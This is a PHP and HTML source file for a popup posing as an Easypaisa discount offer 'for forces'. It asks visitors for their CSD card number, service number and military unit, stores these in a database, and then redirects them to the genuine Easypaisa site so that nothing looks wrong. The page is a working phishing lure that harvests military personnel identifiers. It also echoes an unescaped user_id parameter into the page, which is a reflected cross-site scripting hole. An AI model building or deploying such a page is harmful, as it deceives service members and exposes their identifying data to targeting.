<?php
include 'database.php';

if (isset($_POST['submit'])) {
    $user_id = $_POST['user_id'];
    $csd_card_number = !empty($_POST['csd_card_number']) ? $_POST['csd_card_number'] : null;  // Optional field
    $army_number = $_POST['army_number'];  // Mandatory field
    $organization = $_POST['organization'];  // Mandatory field

    // Prepare SQL statement to update user details
    $stmt = $conn->prepare("UPDATE users SET csd_card_number = ?, army_number = ?, organization = ? WHERE id = ?");
    $stmt->bind_param("sssi", $csd_card_number, $army_number, $organization, $user_id);

    if ($stmt->execute()) {
        header("Location: https://easypaisa.com.pk/");  // Redirect to Easypaisa
        exit();
    } else {
        echo "Error: " . $conn->error;
    }

    $stmt->close();
}
?>


<!DOCTYPE html>
<html lang="en">
<head>
    <title>Special Offer</title>
    <style>
        body {
            font-family: "Poppins", sans-serif;
            background: rgba(0, 0, 0, 0.5);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .popup {
            background-color: #fff;
            padding: 40px 40px 30px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            width: 350px;
            text-align: center;
            position: relative;
            font-size: 16px;
            color: #333;
        }
        .popup h3 {
            color: #8dc63f;
            font-size: 28px;
            margin-bottom: 20px;
            font-weight: 700;
        }
        .popup p {
            color: #555;
            margin-bottom: 25px;
            font-size: 18px;
            font-weight: 300;
        }
        .popup input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }
        .popup input:focus {
            border-color: #8dc63f;
            box-shadow: 0 0 8px rgba(141, 198, 63, 0.5);
        }
        .popup button {
            background-color: #8dc63f;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            font-size: 18px;
            cursor: pointer;
            border-radius: 8px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        .popup button:hover {
            background-color: #6fa52e;
        }
        /* Close button in the top-right corner */
        .close-btn {
            position: absolute;
            top: 12px;
            right: 12px;
            font-size: 24px;
            cursor: pointer;
            color: #333;
            font-weight: bold;
        }
        .close-btn:hover {
            color: #8dc63f;
        }
        .footer {
            font-size: 14px;
            color: #888;
            margin-top: 15px;
        }
        .footer a {
            color: #8dc63f;
            text-decoration: none;
            font-weight: 600;
        }
        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<!-- Overlay for blur effect -->
<div class="overlay"></div>

<!-- Popup Form -->
<div class="popup">
    <!-- Close Button -->
    <span class="close-btn" onclick="closePopup()">❌</span>
    <h3>Win Amazing Easypaisa Discounts!</h3>
    <p>Exclusive offer for forces! Enter your details and stand a chance to win exciting discounts.</p>
    <p><strong>Hurry up! This limited-time offer is waiting for YOU!</strong></p>

    <form method="POST" action="popup.php">
        <input type="hidden" name="user_id" value="<?php echo $_GET['user_id']; ?>">

        <!-- CSD Card Number (Optional) -->
        <div>
            <label for="csd_card_number">CSD Card Number (Optional)</label>
            <input type="text" id="csd_card_number" name="csd_card_number" placeholder="Enter your CSD Card Number">
        </div>

        <!-- Service Number (Mandatory) -->
        <div>
            <label for="army_number">Service Number</label>
            <input type="text" id="army_number" name="army_number" required placeholder="Enter your service number">
        </div>

        <!-- Organization (Mandatory) -->
        <div>
            <label for="organization">Organization (Unit/Formation)</label>
            <input type="text" id="organization" name="organization" required placeholder="Enter your organization/unit/formation">
        </div>

        <!-- Submit Button -->
        <button type="submit" name="submit">Claim Your Discount</button>

        <!-- Footer -->
        <div class="footer">
            Already a member? <a href="login.php">Login here</a>
        </div>
    </form>
</div>

<script>
    // Close popup and redirect to Easypaisa
    function closePopup() {
        document.querySelector(".popup").style.display = "none"; // Hide the popup
        setTimeout(function () {
            window.location.href = "https://easypaisa.com.pk/"; // Redirect after delay
        }, 100);
    }
</script>

</body>
</html>
